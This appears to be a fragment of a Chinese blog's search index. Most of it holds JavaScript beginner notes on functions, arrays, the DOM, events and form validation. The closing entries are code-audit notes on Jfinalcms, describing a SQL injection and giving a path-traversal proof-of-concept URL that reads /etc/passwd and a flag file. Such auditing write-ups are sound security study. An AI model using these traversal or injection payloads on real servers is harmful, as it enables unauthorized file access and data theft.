循环语句 var sum = 0; var i = 1; do { sum += i; i++; } while (i \u003c= 100); alert(sum); ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:5","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"函数 函数（就是Java中的方法）是被设计为执行特定任务的代码块；JavaScript 函数通过 function 关键词进行定义。 定义格式 函数定义格式有两种： 方式1 function 函数名(参数1,参数2..){ 要执行的代码 } 方式2 var 函数名 = function (参数列表){ 要执行的代码 } 注意： 形式参数不需要类型。因为JavaScript是弱类型语言 function add(a, b){ return a + b; } 上述函数的参数 a 和 b 不需要定义数据类型，因为在每个参数前加上 var 也没有任何意义。 返回值也不需要定义类型，可以在函数内部直接使用return返回即可 函数调用 函数调用函数： 函数名称(实际参数列表); 例如： let result = add(10,20); 注意： JS中，函数调用可以传递任意个数参数，例如 let result = add(1,2,3); 它是将数据 1 传递给了变量a，将数据 2 传递给了变量 b，而数据 3 没有变量接收。 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:6","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"JavaScript常用对象 总共分类三类： 基本对象 BOM对象 DOM对象 比较多，部分示例如下： ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"基本对象之Array JavaScript Array对象用于定义数组 定义格式 数组的定义格式有两种： 方式1 var 变量名 = new Array(元素列表); 例如： var arr = new Array(1,2,3); //1,2,3 是存储在数组中的数据（元素） 方式2 var 变量名 = [元素列表]; 例如： var arr = [1,2,3]; //1,2,3 是存储在数组中的数据（元素） 注意：Java中的数组静态初始化使用的是{}定义，而 JavaScript 中使用的是 [] 定义 元素访问 访问数组中的元素和 Java 语言的一样，格式如下： arr[索引] = 值; 代码演示： // 方式一 var arr = new Array(1,2,3); // alert(arr); // 方式二 var arr2 = [1,2,3]; //alert(arr2); // 访问 arr2[0] = 10; alert(arr2) 特点 JavaScript 中的数组相当于 Java 中集合。数组的长度是可以变化的，而 JavaScript 是弱类型，所以可以存储任意的类型的数据。 例如如下代码： // 变长 var arr3 = [1,2,3]; arr3[10] = 10; alert(arr3[10]); // 10 alert(arr3[9]); //undefined 上面代码在定义数组中给了三个元素，又给索引是 10 的位置添加了数据 10，那么 索引3 到 索引9 位置的元素是什么呢？我们之前就介绍了，在 JavaScript 中没有赋值的话，默认就是 undefined。 如果给 arr3 数组添加字符串的数据，也是可以添加成功的 arr3[5] = \"hello\"; alert(arr3[5]); // hello 属性 Array 对象提供了很多属性，这里以length为例： var arr = [1,2,3]; for (let i = 0; i \u003c arr.length; i++) { //可以动态的获取数组的长度，可以遍历数组 alert(arr[i]); } 方法 Array 对象同样也提供了很多方法 以 push 函数和 splice 函数为例： push 函数：给数组添加元素，也就是在数组的末尾添加元素 参数表示要添加的元素 // push:添加方法 var arr5 = [1,2,3]; arr5.push(10); alert(arr5); //数组的元素是 {1,2,3,10} splice 函数：删除元素 参数1：索引。表示从哪个索引位置删除 参数2：个数。表示删除几个元素 // splice:删除元素 var arr5 = [1,2,3]; arr5.splice(0,1); //从 0 索引位置开始删除，删除一个元素 alert(arr5); // {2,3} ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"String String对象的创建方式有两种 方式1： var 变量名 = new String(s); 方式2： var 变量名 = \"数组\"; 属性： String对象提供了很多属性，以 length为例：该属性是用于动态的获取字符串的长度 函数： 同样有很多，以charAt()返回在指定位置的字符，和indexOf()检索字符串，和trim()去掉字符串两端字符串(比如登录时候去掉用户输入的空格)为例： var s = 'abcd'; console.log(s.charAt(1)); console.log(s.indexOf('c')); var str4 = ' abc '; alert(1 + str4 + 1); 去掉空格： var str4 = ' abc '; alert(1 + str4.trim() + 1); ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"自定义对象 自定义对象的格式： var 对象名称 = { 属性名称1:属性值1, 属性名称2:属性值2, ..., 函数名称:function (形参列表){}, ... }; 调用属性的格式： 对象名.属性名 调用函数的格式： 对象名.函数名() 例子： var person = { name : \"zhangsan\", age : 23, eat: function (){ alert(\"干饭~\"); } }; alert(person.name); //zhangsan alert(person.age); //23 person.eat(); //干饭~ 有那么一点点点像Java中的类一样 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:3","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"BOM BOM：Browser Object Model 浏览器对象模型。也就是 JavaScript 将浏览器的各个组成部分封装为对象。 我们要操作浏览器的各个组成部分就可以通过操作 BOM 中的对象来实现。比如：我现在想将浏览器地址栏的地址改为 https://www.itheima.com 就可以通过使用 BOM 中定义的 Location 对象的 href 属性，代码： location.href = \"https://itheima.com\"; BOM 中包含了如下对象： Window：浏览器窗口对象 Navigator：浏览器对象 Screen：屏幕对象 History：历史记录对象 Location：地址栏对象 下图是 BOM 中的各个对象和浏览器的各个组成部分的对应关系： ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"Window对象 window 对象是 JavaScript 对浏览器的窗口进行封装的对象。 获取window对象: 该对象不需要创建直接使用 window，其中 window. 可以省略。比如我们之前使用的 alert() 函数，其实就是 window 对象的函数，在调用是可以写成如下两种 显式使用 window 对象调用 window.alert(\"abc\"); 隐式调用 alert(\"abc\") window对象属性 window 对象提供了用于获取其他 BOM 组成对象的属性 也就是说，我们想使用 Location 对象的话，就可以使用 window 对象获取；写成 window.location，而 window. 可以省略，简化写成 location 来获取 Location 对象。 window对象函数 window 对象提供了很多函数供我们使用，常用如下： 定时器代码演示： setTimeout(function (){ alert(\"hehe\"); },3000); 当我们打开浏览器，3秒后才会弹框输出 hehe，并且只会弹出一次。 setInterval(function (){ alert(\"hehe\"); },2000); 当我们打开浏览器，每隔2秒都会弹框输出 hehe。 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"History对象 History 对象是 JavaScript 对历史记录进行封装的对象。 History 对象的获取 使用 window.history获取，其中window. 可以省略 History 对象的函数 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"Location对象 Location 对象是 JavaScript 对地址栏封装的对象。可以通过操作该对象，跳转到任意页面。 获取Location对象 使用 window.location获取，其中window. 可以省略 window.location.方法(); location.方法(); Location对象属性 Location对象提供了很对属性。以后常用的只有一个属性 href alert(\"要跳转了\"); location.href = \"https://www.baidu.com\"; ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:3","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"DOM DOM：Document Object Model 文档对象模型。也就是 JavaScript 将 HTML 文档的各个组成部分封装为对象。 类似XML，XML 文档中的标签需要我们写代码解析，而 HTML 文档是浏览器解析。封装的对象分为 Document：整个文档对象 Element：元素对象 Attribute：属性对象 Text：文本对象 Comment：注释对象 如下图，左边是 HTML 文档内容，右边是 DOM 树 作用： JavaScript 通过 DOM， 就能够对 HTML进行操作了 改变 HTML 元素的内容 改变 HTML 元素的样式（CSS） 对 HTML DOM 事件作出反应 添加和删除 HTML 元素 DOM相关概念： DOM 是 W3C（万维网联盟）定义了访问 HTML 和 XML 文档的标准。该标准被分为 3 个不同的部分： 核心 DOM：针对任何结构化文档的标准模型。 XML 和 HTML 通用的标准 Document：整个文档对象 Element：元素对象 Attribute：属性对象 Text：文本对象 Comment：注释对象 XML DOM： 针对 XML 文档的标准模型 HTML DOM： 针对 HTML 文档的标准模型 该标准是在核心 DOM 基础上，对 HTML 中的每个标签都封装成了不同的对象 例如：\u003cimg\u003e 标签在浏览器加载到内存中时会被封装成 Image 对象，同时该对象也是 Element 对象。 例如：\u003cinput type='button'\u003e 标签在浏览器加载到内存中时会被封装成 Button 对象，同时该对象也是 Element 对象 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:4","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"获取 Element对象 HTML 中的 Element 对象可以通过 Document 对象获取，而 Document 对象是通过 window 对象获取。 Document 对象中提供了以下获取 Element 元素对象的函数 getElementById()：根据id属性值获取，返回单个Element对象 getElementsByTagName()：根据标签名称获取，返回Element对象数组 getElementsByName()：根据name属性值获取，返回Element对象数组 getElementsByClassName()：根据class属性值获取，返回Element对象数组 html测试页面： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cimg id=\"light\" src=\"../1.png\"\u003e \u003cbr\u003e \u003cdiv class=\"cls\"\u003e测试\u003c/div\u003e \u003cbr\u003e \u003cdiv class=\"cls\"\u003ehh\u003c/div\u003e \u003cbr\u003e \u003cinput type=\"checkbox\" name=\"hobby\"\u003e 电影 \u003cinput type=\"checkbox\" name=\"hobby\"\u003e 旅游 \u003cinput type=\"checkbox\" name=\"hobby\"\u003e 游戏 \u003cbr\u003e \u003cscript\u003e //在此处书写js代码 \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 1.根据 id 属性值获取上面的 img 元素对象，返回单个对象 var img = document.getElementById(\"light\"); alert(img); 结果如下： 2.根据标签名称获取所有的 div 元素对象 var divs = document.getElementsByTagName(\"div\");// 返回一个数组，数组中存储的是 div 元素对象 // alert(divs.length); //输出 数组的长度 //遍历数组 for (let i = 0; i \u003c divs.length; i++) { alert(divs[i]); } 3.获取所有的满足 name = 'hobby' 条件的元素对象 //3. getElementsByName：根据name属性值获取，返回Element对象数组 var hobbys = document.getElementsByName(\"hobby\"); for (let i = 0; i \u003c hobbys.length; i++) { alert(hobbys[i]); } 4.获取所有的满足 class='cls' 条件的元素对象 //4. getElementsByClassName：根据class属性值获取，返回Element对象数组 var clss = document.getElementsByClassName(\"cls\"); for (let i = 0; i \u003c clss.length; i++) { alert(clss[i]); } ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:5","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"HTML Element对象使用 比如前面html代码中将div标签中内容替换为哈哈: //1，获取所有的 div 元素对象 var divs = document.getElementsByTagName(\"div\"); /* style:设置元素css样式 innerHTML：设置元素内容 */ //2，遍历数组，获取到每一个 div 元素对象，并修改元素内容 for (let i = 0; i \u003c divs.length; i++) { //divs[i].style.color = 'red'; divs[i].innerHTML = \"呵呵\"; } 让所有复选框变为勾选状态： //1，获取所有的 复选框 元素对象 var hobbys = document.getElementsByName(\"hobby\"); //2，遍历数组，通过将 复选框 元素对象的 checked 属性值设置为 true 来改变复选框的选中状态 for (let i = 0; i \u003c hobbys.length; i++) { hobbys[i].checked = true; } ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:6","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"事件 HTML 事件是发生在 HTML 元素上的“事情”。比如：页面上的 按钮被点击、鼠标移动到元素之上、按下键盘按键 等都是事件。 事件监听是JavaScript 可以在事件被侦测到时执行一段逻辑代码。 比如下图输入框，当我们输入了用户名 光标离开 输入框，就需要通过 js 代码对输入的内容进行校验，没通过校验就在输入框后提示 用户名格式有误! ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"事件绑定 JavaScript 提供了两种事件绑定方式： 方式一：通过 HTML标签中的事件属性进行绑定 如下面代码，有一个按钮元素，我们是在该标签上定义 事件属性，在事件属性中绑定函数。onclick 就是 单击事件 的事件属性。onclick='on（）' 表示该点击事件绑定了一个名为 on() 的函数 \u003cinput type=\"button\" onclick='on()’\u003e 下面是点击事件绑定的 on() 函数 function on(){ alert(\"我被点了\"); } 方式二：通过 DOM 元素属性绑定 如下面代码是按钮标签，在该标签上我们并没有使用 事件属性，绑定事件的操作需要在 js 代码中实现 \u003cinput type=\"button\" id=\"btn\"\u003e 下面 js 代码是获取了 id='btn' 的元素对象，然后将 onclick 作为该对象的属性，并且绑定匿名函数。该函数是在事件触发后自动执行 document.getElementById(\"btn\").onclick = function (){ alert(\"我被点了\"); } 代码演示： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c!--方式1：在下面input标签上添加 onclick 属性，并绑定 on() 函数--\u003e \u003cinput type=\"button\" value=\"点我\" onclick=\"on()\"\u003e \u003cbr\u003e \u003cinput type=\"button\" value=\"再点我\" id=\"btn\"\u003e \u003cscript\u003e function on(){ alert(\"我被点了\"); } //方式2：获取 id=\"btn\" 元素对象，通过调用 onclick 属性 绑定点击事件 document.getElementById(\"btn\").onclick = function (){ alert(\"我被点了\"); } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"常见事件 事件属性名 说明 onclick 鼠标单击事件 onblur 元素失去焦点 onfocus 元素获得焦点 onload 某个页面或图像被完成加载 onsubmit 当表单提交时触发该事件 onmouseover 鼠标被移到某元素之上 onmouseout 鼠标从某元素移开 比如onsubmit表单提交事件： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform id=\"register\" action=\"#\" \u003e \u003cinput type=\"text\" name=\"username\" /\u003e \u003cinput type=\"submit\" value=\"提交\"\u003e \u003c/form\u003e \u003cscript\u003e \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 当我们点击 提交 按钮后，表单就会提交，此处默认使用的是 GET 提交方式，会将提交的数据拼接到 URL 后。现需要通过 js 代码实现阻止表单提交的功能，js 代码实现如下： 获取 form 表单元素对象。 给 form 表单元素对象绑定 onsubmit 事件，并绑定匿名函数。 该匿名函数如果返回的是true，提交表单；如果返回的是false，阻止表单提交。 document.getElementById(\"register\").onsubmit = function (){ //onsubmit 返回true，则表单会被提交，返回false，则表单不提交 return true; } ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"案例 注册页面，对表单进行校验，如果输入的用户名、密码、手机号符合规则，则允许提交；如果不符合规则，则不允许提交。 完成以下需求： 当输入框失去焦点时，验证输入内容是否符合要求 当点击注册按钮时，判断所有输入框的内容是否都符合要求，如果不合符则阻止表单提交 初始界面： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003e欢迎注册\u003c/title\u003e \u003clink href=\"../css/register.css\" rel=\"stylesheet\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"form-div\"\u003e \u003cdiv class=\"reg-content\"\u003e \u003ch1\u003e欢迎注册\u003c/h1\u003e \u003cspan\u003e已有帐号？\u003c/span\u003e \u003ca href=\"#\"\u003e登录\u003c/a\u003e \u003c/div\u003e \u003cform id=\"reg-form\" action=\"#\" method=\"get\"\u003e \u003ctable\u003e \u003ctr\u003e \u003ctd\u003e用户名\u003c/td\u003e \u003ctd class=\"inputs\"\u003e \u003cinput name=\"username\" type=\"text\" id=\"username\"\u003e \u003cbr\u003e \u003cspan id=\"username_err\" class=\"err_msg\" style=\"display: none\"\u003e用户名不太受欢迎\u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e密码\u003c/td\u003e \u003ctd class=\"inputs\"\u003e \u003cinput name=\"password\" type=\"password\" id=\"password\"\u003e \u003cbr\u003e \u003cspan id=\"password_err\" class=\"err_msg\" style=\"display: none\"\u003e密码格式有误\u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e手机号\u003c/td\u003e \u003ctd class=\"inputs\"\u003e\u003cinput name=\"tel\" type=\"text\" id=\"tel\"\u003e \u003cbr\u003e \u003cspan id=\"tel_err\" class=\"err_msg\" style=\"display: none\"\u003e手机号格式有误\u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e \u003cdiv class=\"buttons\"\u003e \u003cinput value=\"注 册\" type=\"submit\" id=\"reg_btn\"\u003e \u003c/div\u003e \u003cbr class=\"clear\"\u003e \u003c/form\u003e \u003c/div\u003e \u003cscript\u003e \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 输入框验证规则： 校验用户名。当用户名输入框失去焦点时，判断输入的内容是否符合 长度是 6-12 位 规则，不符合使 id='username_err' 的span标签显示出来，给出用户提示。 校验密码。当密码输入框失去焦点时，判断输入的内容是否符合 长度是 6-12 位 规则，不符合使 id='password_err' 的span标签显示出来，给出用户提示。 校验手机号。当手机号输入框失去焦点时，判断输入的内容是否符合 长度是 11 位 规则，不符合使 id='tel_err' 的span标签显示出来，给出用户提示。 //1. 验证用户名是否符合规则 //1.1 获取用户名的输入框 var usernameInput = document.getElementById(\"username\"); //1.2 绑定onblur事件 失去焦点 usernameInput.onblur = function () { //1.3 获取用户输入的用户名 var username = usernameInput.value.trim(); //1.4 判断用户名是否符合规则：长度 6~12 if (username.length \u003e= 6 \u0026\u0026 username.length \u003c= 12) { //符合规则 document.getElementById(\"username_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"username_err\").style.display = ''; } } //1. 验证密码是否符合规则 //1.1 获取密码的输入框 var passwordInput = document.getElementById(\"password\"); //1.2 绑定onblur事件 失去焦点 passwordInput.onblur = function() { //1.3 获取用户输入的密码 var password = passwordInput.value.trim(); //1.4 判断密码是否符合规则：长度 6~12 if (password.length \u003e= 6 \u0026\u0026 password.length \u003c= 12) { //符合规则 document.getElementById(\"password_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"password_err\").style.display = ''; } } //1. 验证手机号是否符合规则 //1.1 获取手机号的输入框 var telInput = document.getElementById(\"tel\"); //1.2 绑定onblur事件 失去焦点 telInput.onblur = function() { //1.3 获取用户输入的手机号 var tel = telInput.value.trim(); //1.4 判断手机号是否符合规则：长度 11 if (tel.length == 11) { //符合规则 document.getElementById(\"tel_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"tel_err\").style.display = ''; } } 表单验证要求： 当用户点击 注册 按钮时，需要同时对输入的 用户名、密码、手机号 ，如果都符合规则，则提交表单；如果有一个不符合规则，则不允许提交表单。实现该功能需要获取表单元素对象，并绑定 onsubmit 事件 //1. 获取表单对象 var regForm = document.getElementById(\"reg-form\"); //2. 绑定onsubmit 事件 regForm.onsubmit = function () { } //`onsubmit` 事件绑定的函数需要对输入的 `用户名`、`密码`、`手机号` 进行校验，这些校验我们之前都已经实现过了，这里我们还需要再校验一次吗？不需要，只需要对之前校验的代码进行改造，把每个校验的代码专门抽象到有名字的函数中，方便调用；并且每个函数都要返回结果来去决定是提交表单还是阻止表单提交，代码如下： //1. 验证用户名是否符合规则 //1.1 获取用户名的输入框 var usernameInput = document.getElementById(\"username\"); //1.2 绑定onblur事件 失去焦点 usernameInput.onblur = checkUsername; function checkUsername() { //1.3 获取用户输入的用户名 var username = usernameInput.value.trim(); //1.4 判断用户名是否符合规则：长度 6~12 var flag = username.length \u003e= 6 \u0026\u0026 username.length \u003c= 12; if (flag) { //符合规则 document.getElementById(\"username_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"username_err\").style.display = ''; } return flag; } //1. 验证密码是否符合规则 //1.1 获取密码的输入框 var passwordInput = document.getElementById(\"password\"); //1.2 绑定onblur事件 失去焦点 passwordInput.onblur = checkPassword; function checkPassword() { //1.3 获取用户输入的密码 var password = passwordInput.value.trim(); //1.4 判断密码是否符合规则：长度 6~12 var flag = password.length \u003e= 6 \u0026\u0026 password.length \u003c= 12; if (flag) { //符合规则 document.getElementById(\"password_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"password_err\").style.display =","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:3","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"正则表达式 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"正则对象 在 js 中对正则表达式封装的对象就是正则对象。 创建对象 正则对象有两种创建方式： 直接量方式：注意不要加引号 var reg = /正则表达式/; 创建 RegExp 对象 var reg = new RegExp(\"正则表达式\"); 函数 test(str) ：判断指定字符串是否符合规则，返回 true或 false ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"正则表达式 正则表达式定义了字符串组成的规则。也就是判断指定的字符串是否符合指定的规则，如果符合返回true，如果不符合返回false。 正则表达式是和语言无关的。很多语言都支持正则表达式，Java语言也支持，只不过正则表达式在不同的语言中的使用方式不同，js 中需要使用正则对象来使用正则表达式。 正则表达式常用的规则如下： ^：表示开始 $：表示结束 ：代表某个范围内的单个字符，比如： [0-9] 单个数字字符 .：代表任意单个字符，除了换行和行结束符 \\w：代表单词字符：字母、数字、下划线()，相当于 [A-Za-z0-9] \\d：代表数字字符： 相当于 [0-9] 量词： +：至少一个 *：零个或多个 ？：零个或一个 {x}：x个 {m,}：至少m个 {m,n}：至少m个，最多n个 例子： // 规则：单词字符，6~12 //1,创建正则对象，对正则表达式进行封装 var reg = /^\\w{6,12}$/; var str = \"abcccc\"; //2,判断 str 字符串是否符合 reg 封装的正则表达式的规则 var flag = reg.test(str); alert(flag); 这样，前面验证注册表单的例子中： //判断用户名是否符合规则：长度 6~12,单词字符组成 var reg = /^\\w{6,12}$/; var flag = reg.test(username); //判断手机号是否符合规则：长度 11，数字组成，第一位是1 var reg = /^[1]\\d{10}$/; var flag = reg.test(tel); if (flag) { //符合规则 document.getElementById(\"tel_err\").style.display = 'none'; } else { //不合符规则 document.getElementById(\"tel_err\").style.display = ''; ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["代码审计"],"content":"简介 框架使用的Jfinal，模板引擎使用的beetl 项目中的pom.xml记录了项目需要的依赖及其版本信息等，审计源码前，可以看看项目的给类依赖是否为存在漏洞的版本，如果有可以针对某个依赖的当前版本存在的漏洞进行验证。 ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SQL注入 存在的sql注入较多 ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"1 jfinal 框架下的预处理为如下，使用占位符： Long count = Db.queryLong(\"select count(1) from cms_admin where username = ?\",username); 这里使用拼接方式进行数据查询，导致SQL注入： 网上追溯，找到source点： 找到在com/cms/controller/admin/AdminController.java#index()里，传入的name、username参数未做任何处理就被传递给findPage()，那么这里是存在SQL注入的。 测试： 直接用sqlmap跑： http://localhost:8080/admin/admin?name=1 ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:1","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"XSS ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"前台任意文件读取 网上已知这个漏洞的poc：/common/down/file?filekey=/../../../../../../../../../etc/passwd 我们根据poc去寻找一下，搜索/common/down 可以看到直接从前端获取文件参数，且没有进行过滤，可以使用../跨目录读取文件： 构造请求： http://192.168.3.214:8080/common/down/file?fileKey=/../../../../../../../../../../../../../../../../../tmp/flag.txt 